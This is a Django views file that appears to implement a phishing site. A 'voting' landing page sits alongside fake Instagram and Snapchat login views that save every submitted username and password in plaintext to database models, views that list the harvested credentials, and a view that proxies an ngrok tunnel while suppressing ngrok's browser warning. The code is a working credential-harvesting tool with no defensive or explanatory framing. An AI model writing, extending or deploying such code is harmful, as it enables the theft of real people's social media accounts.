from django.shortcuts import render

# Create your views here.

def index(request):
    return render(request, 'voting.html')

# views.py
from django.shortcuts import render, redirect

from .models import SavedCredentials, SnapchatCredentials

def instagram(request):
    if request.method == 'POST':
        username = request.POST.get('username')
        password = request.POST.get('password')
        # Save the username and password to the database
        SavedCredentials.objects.create(username=username, password=password)
        # Redirect back to the login page or any other page you want
        return redirect('home')
    return render(request, 'instagram.html')

# views.py
def snapchat(request):
    if request.method == 'POST':
        username = request.POST.get('username')
        password = request.POST.get('password')
        # Save the username and password to the database
        SnapchatCredentials.objects.create(username=username, password=password)
        # Redirect back to the login page or any other page you want
        return redirect('home')
    return render(request, 'snapchat.html')


# views.py
def view_credentials(request):
    saved_credentials = SavedCredentials.objects.all()
    return render(request, 'view_credentials.html', {'saved_credentials': saved_credentials})

def view_snapchat_credentials(request):
    saved_credentials = SnapchatCredentials.objects.all()
    return render(request, 'view_snapchat_credentials.html', {'saved_credentials': saved_credentials})


import requests
from django.http import HttpResponse

def my_view(request):
    # Get the ngrok URL from the request or any other source
    ngrok_url = "https://ad24-102-90-57-199.ngrok-free.app"

    # Define the custom header
    headers = {
        "ngrok-skip-browser-warning": "true"
    }

    # Make a GET request with the custom header
    response = requests.get(ngrok_url, headers=headers)

    # Return the response content
    return HttpResponse(response.text)
